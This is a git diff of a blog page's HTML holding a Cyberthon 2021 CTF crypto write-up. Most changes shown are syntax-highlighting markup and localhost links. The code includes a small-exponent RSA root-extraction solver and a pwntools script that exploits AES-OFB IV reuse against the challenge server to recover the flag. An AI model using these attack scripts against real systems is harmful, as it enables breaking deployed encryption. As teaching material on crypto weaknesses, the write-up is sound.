@@ -19,10 +19,10 @@
   </script>
   
   
-  <link rel="stylesheet" href="/assets/style.css">
+  <link rel="stylesheet" href="http://localhost:4000/assets/style.css">
 
-  <link rel="canonical" href="/writeups/2021/05/09/Cyberthon.html">
-  <link rel="alternate" type="application/rss+xml" title="N00bcak's Purple Cave" href="/feed.xml">
+  <link rel="canonical" href="http://localhost:4000/writeups/2021/05/09/Cyberthon.html">
+  <link rel="alternate" type="application/rss+xml" title="N00bcak's Purple Cave" href="http://localhost:4000/feed.xml">
 
   <script async defer src="https://buttons.github.io/buttons.js"></script>
 </head>
@@ -125,23 +125,23 @@
 </ul>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Personal comment: PyCryptodome just doesn't feel right in a CTF setting...
-</span><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span>
-<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
-<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
+</span><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span>
+<span class="kn">from</span> <span class="n">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+<span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
 
-<span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA</span><span class="p">.</span><span class="n">construct</span><span class="p">((</span><span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span> <span class="o">*</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">),</span> <span class="mi">5</span><span class="p">))</span>
+<span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA</span><span class="p">.</span><span class="nf">construct</span><span class="p">((</span><span class="nf">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span> <span class="o">*</span> <span class="nf">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">),</span> <span class="mi">5</span><span class="p">))</span>
 
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.txt'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
 
-<span class="n">plaintext</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-<span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">rsa</span><span class="p">.</span><span class="n">e</span><span class="p">,</span> <span class="n">rsa</span><span class="p">.</span><span class="n">n</span><span class="p">)</span>
+<span class="n">plaintext</span> <span class="o">=</span> <span class="nf">bytes_to_long</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">rsa</span><span class="p">.</span><span class="n">e</span><span class="p">,</span> <span class="n">rsa</span><span class="p">.</span><span class="n">n</span><span class="p">)</span>
 
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./dist/flag.txt.encrypted'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./dist/flag.txt.encrypted</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">long_to_bytes</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
 
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./dist/pubkey.pem'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">rsa</span><span class="p">.</span><span class="n">export_key</span><span class="p">(</span><span class="s">'PEM'</span><span class="p">))</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./dist/pubkey.pem</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">rsa</span><span class="p">.</span><span class="nf">export_key</span><span class="p">(</span><span class="sh">'</span><span class="s">PEM</span><span class="sh">'</span><span class="p">))</span>
 
 </code></pre></div></div>
 
@@ -200,26 +200,26 @@ c \equiv m^{e} \pmod N
 
 <p>(Unfortunately you will have to endure <code class="language-plaintext highlighter-rouge">Decimal</code> code since I was too lazy to get <code class="language-plaintext highlighter-rouge">Sagemath</code> to work and I did the exact same challenge last year…)</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span><span class="n">bytes_to_long</span>
-<span class="kn">from</span> <span class="nn">decimal</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">N</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="mh">0x00a55869b46dfbe65a018f243c59bd8c1ea75bec4eb4ff1a0e3423a63c416583e5d43a16b9ec3f79f5a227e5579cf216d38515c36967935fd487a71438e167bef5f75a9eb0efa4c0451f0b052feb0614b4b51cf00c3320032017ba3b0e1ceff69aeb90131f8b3d80df14caf63f2a6d3ef40893360b0f12cd4e15a168b37d5f85e1</span><span class="p">)</span>
-<span class="n">e</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="n">Decimal</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-<span class="n">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">1000</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span><span class="n">bytes_to_long</span>
+<span class="kn">from</span> <span class="n">decimal</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">N</span><span class="o">=</span><span class="nc">Decimal</span><span class="p">(</span><span class="mh">0x00a55869b46dfbe65a018f243c59bd8c1ea75bec4eb4ff1a0e3423a63c416583e5d43a16b9ec3f79f5a227e5579cf216d38515c36967935fd487a71438e167bef5f75a9eb0efa4c0451f0b052feb0614b4b51cf00c3320032017ba3b0e1ceff69aeb90131f8b3d80df14caf63f2a6d3ef40893360b0f12cd4e15a168b37d5f85e1</span><span class="p">)</span>
+<span class="n">e</span><span class="o">=</span><span class="nc">Decimal</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="nc">Decimal</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="nf">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">1000</span>
 
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt.encrypted"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">c</span><span class="o">=</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">flag.txt.encrypted</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">c</span><span class="o">=</span><span class="nf">bytes_to_long</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
 
-<span class="n">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">1000</span>
-<span class="n">N</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
-<span class="n">E</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
-<span class="n">C</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
-    <span class="n">R</span><span class="o">=</span><span class="n">Decimal</span><span class="p">((</span><span class="n">k</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="n">C</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="n">E</span><span class="p">))</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">R</span><span class="o">!=</span><span class="n">R</span><span class="p">.</span><span class="n">to_integral_value</span><span class="p">()):</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"R for {}: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">R</span><span class="p">))</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"Integer Form of R: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="n">to_integral_value</span><span class="p">()))</span>
+<span class="nf">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">1000</span>
+<span class="n">N</span><span class="o">=</span><span class="nc">Decimal</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
+<span class="n">E</span><span class="o">=</span><span class="nc">Decimal</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+<span class="n">C</span><span class="o">=</span><span class="nc">Decimal</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
+    <span class="n">R</span><span class="o">=</span><span class="nc">Decimal</span><span class="p">((</span><span class="n">k</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="n">C</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="n">E</span><span class="p">))</span>
+    <span class="nf">if</span><span class="p">(</span><span class="n">R</span><span class="o">!=</span><span class="n">R</span><span class="p">.</span><span class="nf">to_integral_value</span><span class="p">()):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">R for {}: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">R</span><span class="p">))</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Integer Form of R: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="nf">to_integral_value</span><span class="p">()))</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"Yay! {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="n">to_integral_value</span><span class="p">())))</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Yay! {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">long_to_bytes</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="nf">to_integral_value</span><span class="p">())))</span>
         <span class="k">break</span>
 </code></pre></div></div>
 
@@ -248,63 +248,63 @@ Can you try to recover the flag?
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/python3
 </span>
-<span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">MD5</span>
-<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
-<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
-<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="n">Crypto.Hash</span> <span class="kn">import</span> <span class="n">MD5</span>
+<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">from</span> <span class="n">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
+<span class="kn">import</span> <span class="n">sys</span>
 
 
-<span class="n">KEY</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/home/encraptor1/aeskey'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
-<span class="n">IV</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/home/encraptor1/iv'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">KEY</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/encraptor1/aeskey</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+<span class="n">IV</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/encraptor1/iv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
 
 
 <span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">prompt</span><span class="p">):</span>
-    <span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">data</span>
 
 
 <span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">):</span>
     <span class="k">try</span><span class="p">:</span>
-        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
     <span class="k">except</span> <span class="nb">TypeError</span><span class="p">:</span>
-        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
 
-    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
 
 
 <span class="k">def</span> <span class="nf">md5sum</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">md5</span> <span class="o">=</span> <span class="n">MD5</span><span class="p">.</span><span class="n">new</span><span class="p">()</span>
-    <span class="n">md5</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">md5</span> <span class="o">=</span> <span class="n">MD5</span><span class="p">.</span><span class="nf">new</span><span class="p">()</span>
+    <span class="n">md5</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 
-    <span class="k">return</span> <span class="n">md5</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">md5</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">()</span>
 
 
 <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
-    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_OFB</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">md5sum</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_OFB</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">unhexlify</span><span class="p">(</span><span class="nf">md5sum</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">banner</span><span class="p">():</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">"  ______        _____                 _               __   ___  </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">" |  ____|      / ____|               | |             /_ | / _ </span><span class="se">\\</span><span class="s"> </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">" | |__   _ __ | |     _ __ __ _ _ __ | |_ ___  _ __   | || | | |</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">" |  __| | '_ </span><span class="se">\\</span><span class="s">| |    | '__/ _` | '_ </span><span class="se">\\</span><span class="s">| __/ _ </span><span class="se">\\</span><span class="s">| '__|  | || | | |</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">" | |____| | | | |____| | | (_| | |_) | || (_) | |     | || |_| |</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">" |______|_| |_|</span><span class="se">\\</span><span class="s">_____|_|  </span><span class="se">\\</span><span class="s">__,_| .__/ </span><span class="se">\\</span><span class="s">__</span><span class="se">\\</span><span class="s">___/|_|     |_(_)___/ </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">"                               | |                              </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">"                               |_|                              </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">  ______        _____                 _               __   ___  </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s"> |  ____|      / ____|               | |             /_ | / _ </span><span class="se">\\</span><span class="s"> </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s"> | |__   _ __ | |     _ __ __ _ _ __ | |_ ___  _ __   | || | | |</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s"> |  __| | </span><span class="sh">'</span><span class="s">_ </span><span class="se">\\</span><span class="s">| |    | </span><span class="sh">'</span><span class="s">__/ _` | </span><span class="sh">'</span><span class="s">_ </span><span class="se">\\</span><span class="s">| __/ _ </span><span class="se">\\</span><span class="s">| </span><span class="sh">'</span><span class="s">__|  | || | | |</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s"> | |____| | | | |____| | | (_| | |_) | || (_) | |     | || |_| |</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s"> |______|_| |_|</span><span class="se">\\</span><span class="s">_____|_|  </span><span class="se">\\</span><span class="s">__,_| .__/ </span><span class="se">\\</span><span class="s">__</span><span class="se">\\</span><span class="s">___/|_|     |_(_)___/ </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">                               | |                              </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">                               |_|                              </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">);</span>
 <span class="c1"># To be fair 
-</span><span class="n">banner</span><span class="p">()</span>
+</span><span class="nf">banner</span><span class="p">()</span>
 
-<span class="n">data</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="s">'[+] Data: '</span><span class="p">)</span>
-<span class="n">write</span><span class="p">(</span><span class="s">'[+] Encrypted:</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
-<span class="n">write</span><span class="p">(</span><span class="s">'----------------------------- START -------------------------------</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
-<span class="n">write</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">IV</span><span class="p">))</span>
-<span class="n">write</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">------------------------------ END --------------------------------'</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Data: </span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Encrypted:</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="s">----------------------------- START -------------------------------</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">write</span><span class="p">(</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">IV</span><span class="p">))</span>
+<span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">------------------------------ END --------------------------------</span><span class="sh">'</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>Ostensibly this uses the AES block cipher with <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)">Output-Feedback</a> mode (OFB).</p>
@@ -332,22 +332,22 @@ Can you try to recover the flag?
 <h3 id="the-flag">The flag</h3>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># IV reuse in OFB mode
 # No better than XOR cipher.
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg"</span><span class="p">,</span><span class="mi">20101</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">shutdown</span><span class="p">()</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"----------------------------- START -------------------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-<span class="n">enc</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"------------------------------ END --------------------------------"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">68</span><span class="p">]</span>
-<span class="k">print</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
-<span class="n">key</span><span class="o">=</span><span class="n">xor</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"KEY FOUND: </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">r</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg</span><span class="sh">"</span><span class="p">,</span><span class="mi">20101</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">shutdown</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">----------------------------- START -------------------------------</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">enc</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------ END --------------------------------</span><span class="sh">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">68</span><span class="p">]</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+<span class="n">key</span><span class="o">=</span><span class="nf">xor</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">KEY FOUND: </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 <span class="c1"># Now that we recovered the iv, we simply go and decrypt anything we like...
-</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt.encrypted"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">flag</span><span class="o">=</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
-<span class="n">msg</span><span class="o">=</span><span class="n">xor</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span><span class="n">key</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
